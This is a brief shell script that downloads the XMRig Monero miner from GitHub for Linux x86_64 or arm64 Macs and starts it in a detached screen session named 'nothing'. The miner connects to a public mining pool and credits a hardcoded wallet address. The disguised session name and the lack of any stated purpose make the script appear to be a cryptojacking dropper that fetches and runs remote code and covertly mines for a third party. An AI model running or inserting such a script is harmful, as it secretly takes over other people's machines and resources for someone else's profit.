#!/bin/sh -e
export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd

if arch | grep x86_64 > /dev/null;
	then
        echo "Detected x86_64 assuming linux"
        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O
        tar -xzf xmrig-6.16.4-linux-x64.tar.gz
elif arch | grep arm64 > /dev/null;
	then
		echo "Detected arch 64 assuming m1 mac"
        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-arm64.tar.gz -O
        tar -xzf xmrig-6.16.4-macos-arm64.tar.gz
else
	echo "No supported arch detected"
fi
chmod +x ./xmrig-6.16.4/xmrig
screen -dmS nothing xmrig-6.16.4/xmrig -o pool.minexmr.com:4444 -u $ADDR